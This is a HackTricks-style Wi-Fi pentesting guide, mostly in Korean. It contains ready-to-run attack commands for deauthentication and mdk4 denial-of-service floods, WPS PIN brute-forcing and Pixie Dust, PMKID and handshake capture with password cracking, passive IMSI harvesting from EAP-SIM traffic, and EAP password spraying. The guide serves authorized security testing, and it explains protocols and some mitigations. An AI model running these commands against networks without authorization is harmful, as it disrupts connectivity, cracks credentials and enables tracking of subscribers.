# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Wifi 기본 명령어
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## 도구

### Hijacker & NexMon (Android 내부 Wi-Fi)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**docker로 airgeddon 실행**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
출처: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Evil Twin, KARMA, Known Beacons 공격을 수행한 다음 phishing 템플릿을 사용하여 네트워크의 실제 비밀번호를 얻거나 소셜 네트워크 자격 증명을 탈취할 수 있습니다.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

이 도구는 **WPS/WEP/WPA-PSK** 공격을 자동화합니다. 다음을 자동으로 수행합니다:

- 인터페이스를 monitor 모드로 설정
- 가능한 네트워크를 스캔하고, 공격 대상(victim)을 선택하도록 함
- WEP인 경우 - WEP 공격 실행
- WPA-PSK인 경우
- WPS인 경우: Pixie dust attack 및 bruteforce attack 수행(주의: brute-force attack은 오래 걸릴 수 있음). null PIN 또는 database/generated PINs는 시도하지 않습니다.
- AP에서 PMKID를 캡처해 크랙 시도
- 핸드셰이크를 캡처하기 위해 AP의 클라이언트를 deauthenticate하려 시도
- PMKID나 Handshake가 있으면 top5000 passwords로 bruteforce 시도

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- 모두 연결 해제(또는 특정 ESSID/Client)
- Random fake APs -- 네트워크 숨기기, 스캐너 충돌 가능성
- Overload AP -- AP를 다운시키려 시도(보통 별로 유용하지 않음)
- WIDS -- IDS와 상호작용
- TKIP, EAPOL -- 일부 AP를 DoS하기 위한 특정 공격들
- **Cracking**
- Crack **WEP** (여러 도구 및 방법)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- 캡티브 포털 creds를 캡처하거나 LAN 공격을 수행하는 데 유용
- **WPA-PSK** Evil Twin -- 비밀번호를 알고 있으면 네트워크 공격에 유용
- **WPA-MGT** -- 회사 자격 증명 캡처에 유용
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- 캡티브 포털 creds를 캡처하거나 LAN 공격을 수행하는 데 유용
- **+ WPA** -- WPA handshakes를 캡처하는 데 유용

## DOS

### Deauthentication Packets

**설명 출처** [**here**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** 공격은 Wi-Fi 해킹에서 널리 사용되는 방법으로, "management" 프레임을 위조하여 **네트워크에서 장치를 강제로 분리**합니다. 이러한 암호화되지 않은 패킷은 클라이언트가 정당한 네트워크에서 온 것으로 오인하도록 속여, 공격자가 WPA handshakes를 수집해 크래킹에 사용하거나 네트워크 연결을 지속적으로 방해할 수 있게 합니다. 이 전술은 단순함 때문에 놀랍게도 널리 사용되며 네트워크 보안에 중대한 영향을 미칩니다.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0는 deauthentication을 의미합니다
- 1은 보낼 deauths의 수입니다(원하면 여러 개를 보낼 수 있음); 0은 지속적으로 보낸다는 의미입니다
- -a 00:14:6C:7E:40:80는 access point의 MAC 주소입니다
- -c 00:0F:B5:34:30:30는 deauthenticate할 client의 MAC 주소입니다; 이것을 생략하면 broadcast deauthentication이 전송됩니다(항상 작동하지 않을 수 있음)
- ath0는 인터페이스 이름입니다

### Disassociation Packets

**Disassociation packets**는 deauthentication packets과 유사하게 Wi-Fi 네트워크에서 사용되는 management frame의 한 유형입니다. 이 패킷들은 장치(예: 노트북 또는 스마트폰)와 access point(AP) 간의 연결을 끊는 역할을 합니다. disassociation과 deauthentication의 주요 차이점은 사용 시나리오에 있습니다. 한편 AP는 네트워크에서 rogue devices를 명시적으로 제거하기 위해 **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, 재시작 또는 이전할 때 보통 disassociation packets이 전송되어 연결된 모든 노드의 연결을 끊습니다.

**이 공격은 mdk4(mode "d")로 수행할 수 있습니다:**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **mdk4로 하는 더 많은 DOS 공격**

**자세한 내용은** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

beacon frames를 전송하여 clients에 fake APs를 표시합니다. 때때로 이것은 network scanners나 심지어 drivers까지 충돌시킬 수 있습니다!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

범위 내의 모든 접근 가능한 Access Points (APs)에 인증 프레임을 전송하면, 특히 다수의 클라이언트가 얽혀 있을 때 이들 AP에 과부하를 초래할 수 있습니다. 이로 인한 집중 트래픽은 시스템 불안정을 유발해 일부 AP가 멈추거나 심지어 리셋될 수 있습니다.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs)는 SSID가 제대로 노출되는지 확인하고 AP의 전파 범위를 확인합니다. 이 기법은 단어 목록 사용 여부와 상관없이 **bruteforcing hidden SSIDs**와 결합하면 숨겨진 네트워크를 식별하고 접근하는 데 도움이 됩니다.

**ATTACK MODE m: Michael Countermeasures Exploitation**

임의의 패킷이나 중복 패킷을 다른 QoS 큐로 전송하면 **TKIP APs**에서 Michael Countermeasures를 유발하여 AP가 1분간 셧다운될 수 있습니다. 이 방법은 효율적인 **DoS** (Denial of Service) 공격 전술입니다.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

AP에 **EAPOL Start frames**를 대량 전송하면 **fake sessions**가 생성되어 AP에 과부하를 일으켜 정당한 클라이언트를 차단합니다. 또는 **fake EAPOL Logoff messages**를 주입하면 클라이언트를 강제로 연결 해제하여 두 방법 모두 네트워크 서비스를 효과적으로 방해합니다.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: IEEE 802.11s 메쉬 네트워크에 대한 공격**

메쉬 네트워크에서의 링크 관리 및 라우팅에 대한 다양한 공격.

**ATTACK MODE w: WIDS 혼란**

클라이언트를 여러 WDS 노드나 가짜 rogue APs에 교차 연결하면 Intrusion Detection and Prevention Systems을 조작해 혼란을 야기하고 잠재적인 시스템 남용을 초래할 수 있다.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

다양한 패킷 소스와 패킷 조작을 위한 포괄적인 modifiers 세트를 갖춘 packet fuzzer.

### **Airggedon**

_**Airgeddon**_ 은 이전 항목들에서 제시된 대부분의 공격을 제공합니다:

![](<../../images/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup)는 라우터에 장치를 연결하는 과정을 단순화하여 **WPA** 또는 **WPA2** Personal로 암호화된 네트워크의 설정 속도와 편의성을 향상시킵니다. WEP처럼 쉽게 무력화되는 보안에는 효과가 없습니다. WPS는 8자리 PIN을 사용하며, 이 PIN은 두 절반으로 검증되기 때문에 조합 수가 제한적(약 11,000가지)이라 무차별 대입 공격에 취약합니다.

### WPS Bruteforce

이 작업을 수행하는 주요 도구는 Reaver와 Bully의 두 가지입니다.

- **Reaver**는 WPS에 대한 강력하고 실용적인 공격으로 설계되었으며, 다양한 AP와 WPS 구현체에 대해 테스트되었습니다.
- **Bully**는 WPS 무차별 대입 공격의 **new implementation**으로 C로 작성되었습니다. 원래 reaver 코드에 비해 몇 가지 장점이 있습니다: 종속성 감소, 향상된 메모리 및 CPU 성능, endianness의 올바른 처리, 그리고 더 견고한 옵션 세트.

이 공격은 **WPS PIN의 취약성**을 악용합니다. 특히 처음 네 자리의 노출과 마지막 자리의 체크섬 역할 때문에 무차별 대입이 용이합니다. 그러나 공격자에 대해 **MAC addresses 차단**과 같은 무차별 대입 방어가 있을 경우, 공격을 지속하려면 **MAC address rotation**이 필요합니다.

Bully나 Reaver 같은 도구로 WPS PIN을 얻으면, 공격자는 WPA/WPA2 PSK를 유추할 수 있어 **지속적인 네트워크 접근**을 확보할 수 있습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

이 정교한 접근법은 알려진 취약점을 이용해 WPS PINs를 겨냥합니다:

1. **사전 발견된 PINs**: 동일한 WPS PINs를 사용하는 것으로 알려진 특정 제조사와 연결된 알려진 PINs의 데이터베이스를 활용합니다. 이 데이터베이스는 MAC-addresses의 처음 세 옥텟을 해당 제조사에 대해 가능성이 높은 PINs와 연관시킵니다.
2. **PIN 생성 알고리즘**: ComputePIN, EasyBox와 같은 알고리즘을 활용하여 AP의 MAC-address를 기반으로 WPS PINs를 계산합니다. Arcadyan 알고리즘은 추가로 device ID가 필요해 PIN 생성 과정에 한 층을 더합니다.

### WPS Pixie Dust attack

**Dominique Bongard**은 일부 Access Points (APs)에서 비밀 코드인 **nonces**(**E-S1** 및 **E-S2**) 생성에 관한 결함을 발견했습니다. 이 nonces를 알아낼 수 있다면 AP의 WPS PIN을 깨는 것이 쉬워집니다. AP는 자신이 정당한 장치이며 가짜(rogue) AP가 아님을 증명하기 위해 PIN을 특수 코드(hash) 안에 드러냅니다. 이 nonces는 본질적으로 WPS PIN을 담고 있는 "금고"를 여는 "열쇠"입니다. 자세한 내용은 [여기](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)에서 확인할 수 있습니다.

간단히 말해, 문제는 일부 AP들이 연결 과정에서 PIN을 암호화할 때 충분히 무작위성이 높은 키를 사용하지 않았다는 점입니다. 이로 인해 PIN은 네트워크 외부에서 추측될 수 있는 취약성(offline brute force attack)을 가지게 됩니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
장치를 monitor mode로 전환하고 싶지 않거나 `reaver`와 `bully`에 문제가 있는 경우, [OneShot-C](https://github.com/nikita-yfh/OneShot-C)를 시도해 보세요. 이 도구는 monitor mode로 전환하지 않고도 Pixie Dust attack을 수행할 수 있습니다.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

설계가 부실한 일부 시스템은 심지어 **Null PIN**(비어 있거나 존재하지 않는 PIN)으로 접근을 허용하기도 하는데, 이는 꽤 이례적입니다. 도구 **Reaver**는 이 취약점을 테스트할 수 있지만, **Bully**는 그렇지 않습니다.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

제안된 모든 WPS 공격은 _**airgeddon.**_을 사용해 쉽게 수행할 수 있습니다.

![](<../../images/image (219).png>)

- 5와 6은 **사용자 지정 PIN**(있는 경우)을 시도할 수 있게 합니다
- 7과 8은 **Pixie Dust attack**을 수행합니다
- 13은 **NULL PIN**을 테스트할 수 있게 합니다
- 11과 12는 **사용 가능한 데이터베이스에서 선택한 AP와 관련된 PIN을 수집**하고 **생성**된 가능한 **PIN들**을 ComputePIN, EasyBox 및 선택적으로 Arcadyan(권장, 왜 안 해?)을 사용하여 제공합니다
- 9와 10은 **모든 가능한 PIN**을 테스트합니다

## **WEP**

너무 취약해서 요즘에는 사용되지 않습니다. _**airgeddon**_에는 이러한 보호를 공격하기 위한 "All-in-One"이라는 WEP 옵션이 있다는 것만 알아두세요. 유사한 옵션을 제공하는 도구들이 더 있습니다.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

2018년에, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) 새로운 공격 방법을 공개했는데, 이 방법은 **one single packet**만 필요하고 대상 AP에 연결된 클라이언트가 없어도 된다는 점에서 독특합니다—공격자와 AP 간의 상호작용만 있으면 됩니다.

많은 최신 라우터는 연결(association) 중 **optional field**를 **first EAPOL** 프레임에 추가하는데, 이는 `Robust Security Network`로 알려져 있으며 `PMKID`를 포함합니다.

원문 포스트가 설명하듯이, **PMKID**는 알려진 데이터를 사용하여 생성됩니다:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Given that the "PMK Name" is constant, we know the BSSID of the AP and the station, and the `PMK` is identical to the one from a full 4-way handshake, **hashcat** can use this information to crack the PSK and recover the passphrase!

To **gather** this information and **bruteforce** locally the password you can do:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs captured** 는 **console** 에 표시되고 또한 \_ **/tmp/attack.pcap**\_ 안에 **saved** 됩니다\
이제 해당 capture를 **hashcat/john** 포맷으로 변환하고 crack 하세요:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
올바른 해시 형식은 **4개의 부분**으로 구성됩니다, 예: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` 만약 본인의 것이 **오직** **3개의 부분**만 포함한다면, 이는 **유효하지 않습니다** (PMKID 캡처가 유효하지 않았습니다).

참고로 `hcxdumptool`은 **또한 handshakes를 캡처합니다** (다음과 같은 출력이 나타날 수 있습니다: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). `cap2hccapx`를 사용해 **handshakes**를 **hashcat**/**john** 형식으로 **변환**할 수 있습니다.
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_I have noticed that some handshakes captured with this tool couldn't be cracked even knowing the correct password. I would recommend to capture handshakes also via traditional way if possible, or capture several of them using this tool._

### Handshake 캡처

**WPA/WPA2** 네트워크에 대한 공격은 **handshake**을 캡처하고 비밀번호를 **offline**으로 **crack**하려 시도함으로써 수행할 수 있습니다. 이 과정은 특정 네트워크의 통신과 **BSSID**를 특정 **channel**에서 모니터링하는 것을 포함합니다. 다음은 간단한 안내입니다:

1. 대상 네트워크의 **BSSID**, **channel**, 및 **connected client**를 식별합니다.
2. 지정된 **channel**과 **BSSID**에서 네트워크 트래픽을 모니터링하여 **handshake**를 캡처하기 위해 `airodump-ng`를 사용합니다. 명령은 다음과 같습니다:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. handshake 캡처 확률을 높이려면 클라이언트를 네트워크에서 잠시 분리하여 재인증을 강제하세요. 이는 클라이언트에 deauthentication packets을 전송하는 `aireplay-ng` 명령을 사용해서 할 수 있습니다:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_client가 deauthenticated된 경우 다른 AP에 연결을 시도하거나, 경우에 따라 다른 network에 연결을 시도할 수 있다는 점을 유의하세요._

`airodump-ng`에 handshake 정보가 표시되면 handshake가 캡처된 것이므로 모니터링을 중지할 수 있습니다:

![](<../../images/image (172) (1).png>)

handshake가 캡처되면 `aircrack-ng`로 **crack**할 수 있습니다:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### 파일에 handshake가 있는지 확인

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_이 도구가 완료된 handshake보다 먼저 ESSID의 미완성 handshake를 찾으면 유효한 것을 감지하지 못합니다._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

엔터프라이즈 WiFi 설정에서는 **다양한 인증 방식을 접하게 되며**, 각 방식은 서로 다른 보안 수준과 관리 기능을 제공합니다. 네트워크 트래픽을 검사하기 위해 `airodump-ng` 같은 도구를 사용하면 이러한 인증 유형을 나타내는 식별자를 확인할 수 있습니다. 일반적인 방법에는 다음이 있습니다:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- 이 방식은 하드웨어 토큰과 일회용 비밀번호를 EAP-PEAP 내에서 지원한다. MSCHAPv2와 달리 peer challenge를 사용하지 않으며 비밀번호를 액세스 포인트로 평문으로 전송하므로 downgrade attacks의 위험이 있다.
2. **EAP-MD5 (Message Digest 5)**:
- 클라이언트가 비밀번호의 MD5 해시를 전송하는 방식이다. 사전 공격에 취약하고 서버 인증이 없으며 세션별 WEP 키를 생성할 수 없기 때문에 **권장되지 않는다**.
3. **EAP-TLS (Transport Layer Security)**:
- 클라이언트와 서버 양측의 인증서를 사용하여 인증을 수행하며 사용자 기반 및 세션 기반의 동적 WEP 키를 생성해 통신을 보호할 수 있다.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- 암호화된 터널을 통해 상호 인증을 제공하며, 사용자별·세션별 동적 WEP 키를 유도하는 방법을 제공한다. 서버 측 인증서만 필요하고 클라이언트는 자격 증명을 사용한다.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- TLS 터널을 만들어 보호된 통신을 제공한다는 점에서 EAP와 유사하게 동작한다. 터널이 제공하는 보호 덕분에 EAP 위에서 더 약한 인증 프로토콜을 사용할 수 있다.
- **PEAP-MSCHAPv2**: 흔히 PEAP라고 불리며, 취약한 MSCHAPv2 challenge/response 메커니즘을 TLS 터널로 보호하는 방식이다.
- **PEAP-EAP-TLS (or PEAP-TLS)**: EAP-TLS와 유사하지만 인증서 교환 전에 TLS 터널을 먼저 설정해 추가적인 보안 계층을 제공한다.

자세한 내용은 [https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol]와 [https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html]를 참고하라.

### Username Capture

[https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27)를 읽어보면, **EAP**를 사용하는 경우 **"Identity"** **messages**는 **지원되어야** 하며, **사용자 이름**은 **"Response Identity"** 메시지에서 **평문으로(clear)** 전송된다는 것을 알 수 있다.

가장 안전한 인증 방법 중 하나인 **PEAP-EAP-TLS**를 사용하더라도 **EAP 프로토콜로 전송되는 사용자 이름을 캡처할 수 있다**. 방법은 인증 통신을 캡처하는 것이다(채널에서 `airodump-ng`를 실행하고 동일한 인터페이스에서 `wireshark` 실행)하고 패킷을 `eapol`로 필터링한다.\
"**Response, Identity**" 패킷 내부에 클라이언트의 **사용자 이름**이 표시된다.

![](<../../images/image (850).png>)

### Anonymous Identities

Identity 숨기기는 EAP-PEAP와 EAP-TTLS 모두에서 지원된다. WiFi 네트워크 맥락에서 EAP-Identity 요청은 일반적으로 association 과정 중 AP가 시작한다. 사용자 익명성을 보호하기 위해, 사용자의 기기에 있는 EAP 클라이언트의 응답은 초기 RADIUS 서버가 요청을 처리하는 데 필요한 최소한의 정보만 포함한다. 다음 시나리오들이 이 개념을 설명한다:

- EAP-Identity = anonymous
- 이 시나리오에서는 모든 사용자가 "anonymous"라는 가명 사용자 식별자를 사용한다. 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 서버로 동작하여 PEAP 또는 TTLS 프로토콜의 서버 측을 관리한다. 내부(보호된) 인증 방법은 로컬에서 처리되거나 원격(홈) RADIUS 서버로 위임된다.
- EAP-Identity = anonymous@realm_x
- 이 경우 서로 다른 realm의 사용자들이 신원을 숨기면서 자신들의 realm을 표시한다. 이를 통해 초기 RADIUS 서버는 EAP-PEAP 또는 EAP-TTLS 요청을 홈 realm의 RADIUS 서버로 프록시할 수 있으며, 홈 RADIUS 서버가 PEAP 또는 TTLS 서버로 동작한다. 초기 RADIUS 서버는 단순히 RADIUS 릴레이 노드로 동작한다.
- 또는 초기 RADIUS 서버가 EAP-PEAP 또는 EAP-TTLS 서버로 동작하면서 보호된 인증 방법을 처리하거나 다른 서버로 전달할 수 있다. 이 옵션은 서로 다른 realm에 대해 별도의 정책을 구성할 수 있게 한다.

EAP-PEAP에서는 PEAP 서버와 PEAP 클라이언트 간에 TLS 터널이 설정되면, PEAP 서버가 EAP-Identity 요청을 시작하고 이를 TLS 터널을 통해 전송한다. 클라이언트는 이 두 번째 EAP-Identity 요청에 대해 암호화된 터널을 통해 사용자의 실제 신원을 포함한 EAP-Identity 응답을 보내 응답한다. 이 방식은 802.11 트래픽을 도청하는 누구에게도 사용자의 실제 신원이 노출되는 것을 효과적으로 방지한다.

EAP-TTLS는 약간 다른 절차를 따른다. EAP-TTLS에서는 클라이언트가 일반적으로 TLS 터널로 보호된 상태에서 PAP 또는 CHAP로 인증한다. 이 경우 터널 수립 후 전송되는 초기 TLS 메시지에 User-Name 속성과 Password 또는 CHAP-Password 속성을 포함한다.

어떤 프로토콜을 사용하든, PEAP/TTLS 서버는 TLS 터널이 설정된 이후에 사용자의 실제 신원을 알게 된다. 실제 신원은 user@realm 또는 단순히 user로 표현될 수 있다. 만약 PEAP/TTLS 서버가 사용자 인증까지 담당하는 경우, 이제 서버는 사용자의 신원을 가지고 TLS 터널로 보호된 인증 방법을 진행한다. 또는 PEAP/TTLS 서버는 사용자의 홈 RADIUS 서버로 새로운 RADIUS 요청을 포워드할 수 있다. 이 새로운 RADIUS 요청에는 PEAP 또는 TTLS 프로토콜 레이어가 포함되지 않는다. 보호된 인증 방법이 EAP인 경우, 내부 EAP 메시지들은 EAP-PEAP 또는 EAP-TTLS 래퍼 없이 홈 RADIUS 서버로 전달된다. 발신 RADIUS 메시지의 User-Name 속성은 들어오는 RADIUS 요청의 익명 User-Name을 대체하여 사용자의 실제 신원을 담는다. 보호된 인증 방법이 PAP 또는 CHAP인 경우(이는 TTLS에서만 지원됨), TLS 페이로드에서 추출된 User-Name 및 기타 인증 속성들이 발신 RADIUS 메시지에 삽입되어 들어오는 RADIUS 요청의 익명 User-Name 및 TTLS EAP-Message 속성을 대체한다.

자세한 내용은 [https://www.interlinknetworks.com/app_notes/eap-peap.htm]을 확인하라.

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

EAP‑SIM/EAP‑AKA를 통한 802.1X 기반의 SIM 기반 Wi‑Fi 인증은 배포 시 pseudonyms/protected identities나 inner EAP 주위에 TLS 터널을 구현하지 않으면, 인증되지 않은 identity 단계에서 영구 가입자 식별자(IMSI)를 평문으로 leak할 수 있다.

Where the leak happens (high level):
- 802.11 association이 SSID에 완료된다(종종 FreeWifi_secure 같은 carrier offload SSID, eduroam-like operator realms 등).
- Authenticator가 EAP-Request/Identity를 보낸다.
- 취약한 클라이언트는 보호 없이 자신의 영구 신원 = IMSI(3GPP NAI로 인코딩)를 EAP-Response/Identity로 응답한다.
- 예시 NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- RF를 수동으로 수신하고 있는 누구든지 해당 프레임을 읽을 수 있다. 4-way handshake나 TLS 키잉은 필요하지 않다.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>확장하려면 클릭</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

메모:
- 배포가 보호된 식별자(가명) 없이 bare EAP‑SIM/AKA를 사용하는 경우 TLS 터널이 설정되기 이전에도 작동합니다.
- 노출된 값은 가입자의 SIM에 결부된 영구 식별자입니다; 이를 수집하면 장기 추적과 이후의 통신망 악용을 가능하게 합니다.

영향
- 프라이버시: 공공장소에서의 수동 Wi‑Fi 캡처로 인한 지속적인 사용자/장치 추적.
- 통신망 악용의 발판: IMSI를 이용해 SS7/Diameter 접근 권한을 가진 공격자가 위치 조회를 하거나 통화/SMS 가로채기 및 MFA 탈취를 시도할 수 있습니다.

완화 / 확인할 사항
- 클라이언트가 3GPP 지침(예: 3GPP TS 33.402)에 따라 EAP‑SIM/AKA에 대해 익명 외부 식별자(가명)를 사용하는지 확인하세요.
- identity phase를 터널링하는 것을 권장합니다(예: inner EAP‑SIM/AKA를 담는 EAP‑TTLS/PEAP) — 이렇게 하면 IMSI가 평문으로 전송되지 않습니다.
- association/auth의 패킷 캡처에서 EAP-Response/Identity에 원시 IMSI가 노출되어서는 안 됩니다.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** a **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
이 attack은 `eaphammer`로도 수행할 수 있습니다:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client attacks 이론

### 네트워크 선택 및 로밍

- 802.11 프로토콜은 station이 Extended Service Set (ESS)에 가입하는 방법을 정의하지만, ESS 내에서 ESS 또는 access point (AP)를 선택하는 기준은 명시하지 않습니다.
- Stations는 동일한 ESSID를 공유하는 APs 사이를 로밍할 수 있어 건물이나 구역 전역에서 연결을 유지합니다.
- 프로토콜은 station이 ESS에 인증하는 것을 요구하지만, AP가 station에게 인증하는 것을 의무화하지 않습니다.

### Preferred Network Lists (PNLs)

- Stations는 연결하는 모든 무선 네트워크의 ESSID를 Preferred Network List (PNL)에 저장하며, 네트워크별 구성 정보도 함께 저장합니다.
- PNL은 알려진 네트워크에 자동으로 연결하는 데 사용되어 연결 과정을 간소화해 사용자 경험을 향상합니다.

### Passive Scanning

- APs는 주기적으로 beacon frames를 브로드캐스트하여 자신의 존재와 기능을 알립니다. 브로드캐스트가 비활성화되지 않는 한 AP의 ESSID도 포함됩니다.
